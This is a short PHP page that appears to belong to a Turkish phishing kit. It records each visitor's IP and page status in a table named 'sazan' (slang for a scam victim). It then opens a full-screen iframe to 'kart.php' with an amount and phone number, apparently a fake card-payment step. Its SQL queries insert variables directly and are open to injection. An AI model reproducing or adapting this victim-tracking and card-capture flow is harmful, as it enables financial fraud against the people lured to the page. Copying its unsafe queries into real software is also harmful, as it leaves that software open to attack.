<?php

include("connect.php");

$time=time();
if($now->rowCount()>0){
$db->query("UPDATE sazan SET now = 'Anasayfada', lastOnline='{$time}' WHERE ip = '{$ip}'");
}else{
$db->query("INSERT INTO sazan SET now = 'Anasayfada',lastOnline='{$time}',sound='1',ip='{$ip}'");
}
?>
<style>
  html{
    margin: 0px;
    padding: 0px;
  }
  #b{
        position: fixed;
        top: 30px;
        bottom: 30px;
        left: 5px;
        right: 5px;
        z-index: 1000000;
        display: none;

  }
    #b iframe{
        width: 95%;
        height: 90%;
        display: none;
        margin: auto;
        z-index: 1000000;
    }
  </style>
  <script type="text/javascript">
    function ac(){
      var a = document.getElementById("money").value;
      var b = document.getElementById("phone").value;
      document.getElementById("b").style.display = "inherit";
      document.getElementById("a").style.display = "inherit";
      document.getElementById("a").src = "kart.php?money="+a+"&phone="+b;

    }
  </script>
  <input value="100" id="money"/>
  <input value="5555555555" id="phone"/>

  <div id="b"><iframe id="a" src=""></iframe></div>
  <button onclick="ac()">Ödeme</button>